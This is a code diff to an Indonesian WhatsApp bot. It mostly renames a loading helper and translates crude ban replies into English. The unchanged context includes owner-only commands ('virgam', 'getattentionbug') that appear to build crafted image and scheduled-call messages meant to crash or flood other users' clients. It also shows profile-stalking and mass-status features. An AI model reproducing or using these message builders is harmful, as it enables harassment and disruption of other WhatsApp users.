  if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
@@ -5096,8 +5046,8 @@ await loading()
 break
 //=================================================//
 case 'listmsg': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  let msgs = global.db.data.database
 let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
 let teks = '「 LIST DATABASE 」\n\n'
@@ -5110,7 +5060,7 @@ break
 //=================================================//
 case 'delmsg': case 'deletemsg': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 let msgs = global.db.data.database
 if (!(text.toLowerCase() in msgs)) return reply(`'${text}' tidak terdaftar didalam list pesan`)
 delete msgs[text.toLowerCase()]
@@ -5119,8 +5069,8 @@ reply(`Berhasil menghapus '${text}' dari list pesan`)
 break
 //=================================================//
 case 'getmsg': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
  let msgs = global.db.data.database
  if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
@@ -5144,7 +5094,7 @@ reply(teks)
 break
 //=================================================//
 case 'couple': {
-await loading()
+await inireact()
 let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
 let random = anu[Math.floor(Math.random() * anu.length)]
 zetsubo.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, {quoted:m})
@@ -5153,7 +5103,7 @@ zetsubo.sendMessage(from, { image: { url: random.female }, caption: `Couple Fema
 break
 //=================================================//
 case 'coffe': case 'kopi': {
-await loading()
+await inireact()
 zetsubo.sendMessage(from, {image: { url: 'https://coffee.alexflipnote.dev/random' },
 caption: `☕ Random Coffe`},{quoted:m})
 }
@@ -5161,7 +5111,7 @@ break
 //=================================================//
 case 'getname': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading()
+await inireact()
 if (qtod === "true") {
 namenye = await zetsubo.getName(m.quoted.sender)
 reply(namenye)
@@ -5173,7 +5123,7 @@ break
 //=================================================//
 case 'getpic': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading()
+await inireact()
 if (qtod === "true") {
 try {
 pporg = await zetsubo.profilePictureUrl(m.quoted.sender, 'image')
@@ -5194,7 +5144,7 @@ break
 //=================================================//
 case 'setppbot': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 reply('*Sabar Cuy Loading*')
 if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
@@ -5205,9 +5155,9 @@ break
 //=================================================//
 case 'setppgroup': case 'setppgrup': case 'setppgc': {
 if (!isCreator) return reply('*Premium Only*')
-if (!m.isGroup) return reply('Buat Di Group Bodoh')
-if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
-await loading()
+if (!m.isGroup) return reply('Make it in the Stupid Group')
+if (!isAdmins) return reply('Considered Admin Group')
+await inireact()
 reply('*Sabar Cuy Loading*')
 if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
@@ -5218,7 +5168,7 @@ break
 //=================================================//
 /*case 'block': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()(
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await zetsubo.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
@@ -5226,15 +5176,15 @@ break*/
 //=================================================//
 case 'unblock': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await zetsubo.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 //=================================================//
 case 'stalktiktok':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
 axios.get(`https://api.lolhuman.xyz/api/stalktiktok/${args[0]}?apikey=${apikey}`).then(({ data }) => {
 var caption = `Username : ${data.result.username}\n`
@@ -5285,7 +5235,7 @@ reply(txtayajas)
 break
 //=================================================
 case 'cerpen':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
 var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=${apikey}`)
 var textpp = `Title : ${data.result.title}\n`
 textpp += `Creator : ${data.result.creator}\n`
@@ -5294,7 +5244,7 @@ reply(textpp)
 break
 //=================================================
 case 'ceritahoror':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
 var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${apikey}`)
 var caption = `Title : ${data.result.title}\n`
 caption += `Desc : ${data.result.desc}\n`
@@ -5303,7 +5253,7 @@ zetsubo.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
 break
 //=================================================
 case 'cuaca':
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
 if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
 var { data } = await axios.get(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${apikey}`)
 var textppp = `Tempat : ${data.result.tempat}\n`
@@ -5319,7 +5269,7 @@ reply(textppp)
 break
 //=================================================
 case 'afk': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
@@ -5349,14 +5299,14 @@ font: 3,
 statusJidList: result
 });
 }
-await loading ()
+await inireact()
 }
 reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
 break
 //=================================================
 case 'virgam': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading()
+await inireact()
 var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 	"imageMessage": {
 	"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m232/up-oil-image-b78d6ac8-7f22-41e9-982b-671521789ec1?ccb=9-4&oh=01_AdTbHXT85p8gfE104asrKWx3rZGkWuILwvlP4fehYEHLiw&oe=64E6E572&mms3=true",
@@ -5388,7 +5338,7 @@ break
 //=================================================
 case "buatswimage":{
 if (!isCreator) return reply('*Premium Only*')
-await loading ()
+await inireact()
  if (!quoted) throw `Balas image Dengan Caption ${prefix + command}`
 if (!/image/.test(mime)) throw `Balas image dengan caption *${prefix + command}*`
 const media = await zetsubo.downloadAndSaveMediaMessage(quoted)
@@ -5399,7 +5349,7 @@ break
 //=================================================
 case "buatswvideo":{
 if (!isCreator) return reply('*Premium Only*')
-await loading ()
+await inireact()
  if (!quoted) throw `Balas video Dengan Caption ${prefix + command}`
 if (!/video/.test(mime)) throw `Balas video dengan caption *${prefix + command}*`
 const media = await zetsubo.downloadAndSaveMediaMessage(quoted)
@@ -5410,7 +5360,7 @@ break
 //=================================================
 case 'swin':{
 if (!isCreator) return reply('*Premium Only*')
-await loading ()
+await inireact()
 if (!text) return reply(`masukin text nya`)
 zetsubo.sendMessage('status@broadcast', {
 text: `${text}`
@@ -5424,7 +5374,7 @@ reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di 
 break
 case 'vnsw':{
 if (!isCreator) return reply('*Premium Only*')
-await loading ()
+await inireact()
 if (!text) return reply(`masukin text nya yang ada di database listvn`)
 var huy = fs.readFileSync(`./database/Audio/${text}.mp3`)
 zetsubo.sendMessage('status@broadcast', {audio: huy, mimetype: 'audio/mp4', ptt:true},{
@@ -5437,7 +5387,7 @@ break
 //=================================================
 case 'inisw':{
 if (!isCreator) return reply('*Premium Only*')
-await loading ()
+await inireact()
 if (!text) return reply(`masukin text nya yang ada di database listvn`)
 var buu = fs.readFileSync(`./database/Audio/${text}.mp3`)
 zetsubo.sendMessage('status@broadcast', {audio: buu, mimetype:'audio/mp4', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
@@ -5455,7 +5405,7 @@ break
 //=================================================
 case 'hapusdb':
 if (!isCreator) return reply('*Premium Only*')
-await loading ()
+await inireact()
 if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6289503267904@s.whatsapp.net`)
 yakiii = text.split("|")[0].replace(/[^0-9]/g, '')
 unnnp = pengguna.indexOf(yakiii)
@@ -5466,7 +5416,7 @@ break
 //=================================================//
 case 'listdb':
 if (!isCreator) return reply('*Premium Only*')
-await loading ()
+await inireact()
 if (isBan) return reply('*Lu Di Ban Owner*')
  teksoooo = '*List Database*\n\n'
 for (let i of pengguna) {
@@ -5479,7 +5429,7 @@ break
 case "buatswptv":
 {
 if (!isCreator) return reply('*Premium Only*')
-await loading ()
+await inireact()
  if (!m.quoted) throw `Balas Video Dengan Caption ${prefix + command}`
 var ppt = m.quoted
 var ptv = generateWAMessageFromContent(from, proto.Message.fromObject({
@@ -5495,7 +5445,7 @@ break
 case 'toptv':
 {
 if (!isCreator) return reply('*Premium Only*')
-await loading ()
+await inireact()
  if (!m.quoted) throw `Balas Video Dengan Caption ${prefix + command}`
   if (/video/.test(mime)) {
 var ppt = m.quoted
@@ -5509,7 +5459,7 @@ break
 //=================================================
 case "buatsws":{
 if (!isCreator) return reply('*Premium Only*')
-await loading ()
+await inireact()
  if (!quoted) throw `Balas Sticker Dengan Caption ${prefix + command}`
 if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
 const media = await zetsubo.downloadAndSaveMediaMessage(quoted)
@@ -5537,7 +5487,7 @@ case 'family100': {
 break
 //=================================================//
 case 'tebak': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
  if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
  if (args[0] === "lagu") {
  if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
@@ -5625,7 +5575,7 @@ delete caklontong_desk[m.sender.split('@')[0]]
 break
 //=================================================//
 case 'kuismath': case 'math': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
  if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
  let { genMath, modes } = require('./src/math')
  if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
@@ -5643,7 +5593,7 @@ if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
 break
 //=================================================//
 case 'ttc': case 'ttt': case 'tictactoe': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
  let TicTacToe = require("./lib/tictactoe")
 this.game = this.game ? this.game : {}
 if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
@@ -5695,7 +5645,7 @@ this.game[room.id] = room
 break
 //=================================================//
 case 'delttc': case 'delttt': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
  let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
 if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
 delete this.game[roomnya.id]
@@ -5704,7 +5654,7 @@ reply(`Berhasil delete session room tictactoe !`)
 break
 //=================================================//
 case 'suitpvp': case 'suit': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
 this.suit = this.suit ? this.suit : {}
 let poin = 10
 let poin_lose = 10
@@ -5764,7 +5714,7 @@ zetsubo.sendMessage(from, {text:`${weg}`},{quoted:kalgans})
 break
 
 case  'qc':{
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
 let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
 if (!teks) return reply(`Cara Penggunaan ${prefix}qc teks`)
 const text = `${teks}`
@@ -5810,7 +5760,7 @@ break
 //=================================================//
 case 'getattention': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading()
+await inireact()
 let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage" : {
 "callType": "AUDIO" ,
@@ -5823,7 +5773,7 @@ zetsubo.relayMessage(from, schedule.message, { messageId: schedule.key.id })
 break
 case 'getattention2': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading()
+await inireact()
 let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage" : {
 "callType": "AUDIO",
@@ -5837,7 +5787,7 @@ break
 
 case 'getattention3': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading()
+await inireact()
 let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage" : {
 "callType": "null",
@@ -5850,7 +5800,7 @@ zetsubo.relayMessage(from, schedule.message, { messageId: schedule.key.id })
 break
 case 'getattentionbug': {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
-await loading()
+await inireact()
 konsol = async (teks) => {
 let schedule = generateWAMessageFromContent(from, proto.Message.fromObject({
 "scheduledCallCreationMessage" : {
@@ -6124,7 +6074,7 @@ await sleep(1000)
  	}
 break
 case  'qcstick':{
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
 let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
 if (!teks) return reply(`Cara Penggunaan ${prefix}qc teks`)
 const text = `${teks}`
